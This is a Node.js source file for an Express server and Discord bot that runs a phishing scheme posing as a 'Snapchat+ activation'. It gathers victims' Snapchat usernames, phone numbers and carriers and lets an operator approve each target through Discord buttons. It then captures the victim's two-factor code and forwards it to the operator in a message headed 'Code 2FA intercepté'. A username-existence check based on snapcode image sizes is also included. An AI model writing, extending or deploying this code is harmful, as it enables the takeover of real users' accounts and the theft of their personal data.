require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { v4: uuidv4 } = require('uuid');

// --- Configuration Express ---
const app = express();
app.use(express.json());
app.use(express.static('public'));

// --- Configuration Discord ---
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

// Map pour stocker les demandes en attente
const requests = new Map();

const APPROVAL_CHANNEL_ID = process.env.DISCORD_APPROVAL_CHANNEL;
const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const PORT = process.env.PORT || 3000;

// ================== ROUTES EXPRESS ==================

// 1. Soumission des infos (étape 1)
app.post('/api/submit', async (req, res) => {
    const { snapchat, phone, operator } = req.body;
    if (!snapchat || !phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    const id = uuidv4();
    requests.set(id, {
        snapchat, phone, operator,
        approved: false, rejected: false, code: null
    });

    try {
        const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
        if (!channel) throw new Error("Salon d'approbation introuvable");

        const embed = new EmbedBuilder()
            .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
            .setColor(0xFFFC00)
            .addFields(
                { name: 'Pseudo', value: snapchat, inline: true },
                { name: 'Téléphone', value: phone, inline: true },
                { name: 'Opérateur', value: operator, inline: true },
                { name: 'ID', value: id }
            )
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger)
            );

        await channel.send({ embeds: [embed], components: [row] });
        console.log(`✅ Demande #${id} envoyée à Discord`);
        res.json({ id });
    } catch (err) {
        console.error('Erreur envoi Discord :', err);
        res.status(500).json({ error: 'Erreur serveur' });
    }
});

// 2. Vérification pseudo Snapchat via snapcode (seule API publique fiable)
app.get('/api/check-snapchat/:username', async (req, res) => {
    const username = req.params.username.trim().toLowerCase();

    // Validation format Snapchat : 3-15 chars, lettres/chiffres/tirets/points
    if (!username || username.length < 3 || username.length > 15) {
        return res.json({ exists: false, reason: 'format' });
    }
    if (!/^[a-z0-9][a-z0-9._-]*[a-z0-9]$/.test(username) && username.length > 2) {
        return res.json({ exists: false, reason: 'format' });
    }

    try {
        // L'API snapcode retourne une image PNG.
        // Pour un utilisateur réel avec un Bitmoji : image > ~8KB
        // Pour un utilisateur sans Bitmoji (compte basique) : image ~3-7KB (ghost générique)
        // Pour un pseudo inexistant : l'image est identique au ghost générique (~3KB)
        // On compare donc la taille avec un pseudo connu inexistant.
        const snapcodeUrl = `https://app.snapchat.com/web/deeplink/snapcode?username=${encodeURIComponent(username)}&type=PNG&size=240`;

        const [realRes, fakeRes] = await Promise.all([
            axios.get(snapcodeUrl, {
                responseType: 'arraybuffer',
                timeout: 7000,
                headers: { 'User-Agent': 'Snapchat/12.64.0.65 (iPhone; iOS 16.0)' },
                validateStatus: s => s < 500
            }),
            axios.get(
                'https://app.snapchat.com/web/deeplink/snapcode?username=xyzabc99999notarealsnap&type=PNG&size=240',
                {
                    responseType: 'arraybuffer',
                    timeout: 7000,
                    headers: { 'User-Agent': 'Snapchat/12.64.0.65 (iPhone; iOS 16.0)' },
                    validateStatus: s => s < 500
                }
            )
        ]);

        if (realRes.status === 404) return res.json({ exists: false });

        const realSize = realRes.data.byteLength;
        const fakeSize = fakeRes.data.byteLength;

        console.log(`Snapcode size: ${username}=${realSize}B | fake=${fakeSize}B`);

        // Si la taille est strictement plus grande que le ghost fictif → utilisateur existant
        const exists = realSize > fakeSize + 200;

        if (exists) {
            // Avatar : on utilise l'URL du snapcode directement comme photo de profil
            const avatarUrl = `https://app.snapchat.com/web/deeplink/snapcode?username=${encodeURIComponent(username)}&type=PNG&size=240&bitmoji=enable`;
            return res.json({ exists: true, username, displayName: username, avatarUrl });
        }

        res.json({ exists: false });

    } catch (err) {
        console.error('Erreur check Snapchat:', err.message);
        // En cas d'erreur réseau, on ne bloque pas l'utilisateur
        res.json({ exists: false, error: 'indisponible' });
    }
});

// 3. Statut d'une demande (polling)
app.get('/api/status/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    res.json({
        approved: request.approved,
        rejected: request.rejected,
        snapchat: request.snapchat
    });
});

// 4. Code reçu
app.post('/api/code', async (req, res) => {
    const { id, code } = req.body;
    if (!id || !code) return res.status(400).json({ error: 'Champs manquants' });
    const request = requests.get(id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    if (!request.approved) return res.status(403).json({ error: 'Demande non approuvée' });

    request.code = code;

    const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
    if (channel) {
        const embed = new EmbedBuilder()
            .setTitle('🔐 Code 2FA intercepté')
            .setColor(0x00FF00)
            .addFields(
                { name: 'Pseudo', value: request.snapchat },
                { name: 'Téléphone', value: request.phone },
                { name: 'Opérateur', value: request.operator },
                { name: 'Code', value: code }
            )
            .setTimestamp();
        channel.send({ embeds: [embed] });
    }
    requests.delete(id);
    res.json({ success: true });
});

// --- Interactions Discord (boutons) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    const [action, requestId] = interaction.customId.split('_');
    if (action !== 'approve' && action !== 'reject') return;
    const request = requests.get(requestId);
    if (!request) return interaction.reply({ content: 'Demande introuvable.', ephemeral: true });
    if (request.approved || request.rejected) {
        return interaction.reply({ content: 'Déjà traitée.', ephemeral: true });
    }
    if (action === 'approve') {
        request.approved = true;
        await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });
    } else {
        request.rejected = true;
        await interaction.reply({ content: `❌ Demande refusée pour ${request.snapchat}.`, ephemeral: true });
    }
    await interaction.message.edit({ components: [] });
});

// --- Démarrage ---
client.once('ready', () => {
    console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);
});

client.login(process.env.DISCORD_BOT_TOKEN);

app.listen(PORT, () => {
    console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
});
